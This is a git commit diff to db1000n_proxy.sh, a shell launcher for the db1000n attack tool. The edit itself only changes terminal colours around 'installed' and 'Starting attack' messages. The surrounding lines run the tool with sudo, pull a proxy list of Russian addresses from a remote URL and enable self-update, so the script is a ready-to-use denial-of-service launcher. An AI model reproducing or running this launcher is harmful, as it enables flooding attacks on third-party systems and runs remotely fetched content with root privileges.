1be6d90b2058baf176165ae0e9c5e1c46649c1ad
Operation-Stop-russia <103530329+Operation-Stop-russia@users.noreply.github.com>
2022-04-25 11:03:05 +0300

    Update db1000n_proxy.sh

--- db1000n_proxy.sh
+++ db1000n_proxy.sh
@@ -33,8 +33,8 @@ else
 fi
 
 tar xvf "${ARCHIVE}"
-tput setab 3 echo "db1000n successfully installed"
+tput setaf 4 echo "db1000n successfully installed"
 sleep 1
-echo "Starting attack with using proxies"; tput setaf 4; tput setab 3
+tput setaf 3; echo "Starting attack with using proxies"; tput setaf 3; tput setab 4
 sleep 5
 sudo ./db1000n -proxy '{{ join (split (get_url "https://raw.githubusercontent.com/OleksandrBlack/proxy-scraper-checker/main/proxies/proxies_ru.txt") "\n") "," }}' -enable-self-update -restart-on-update=false
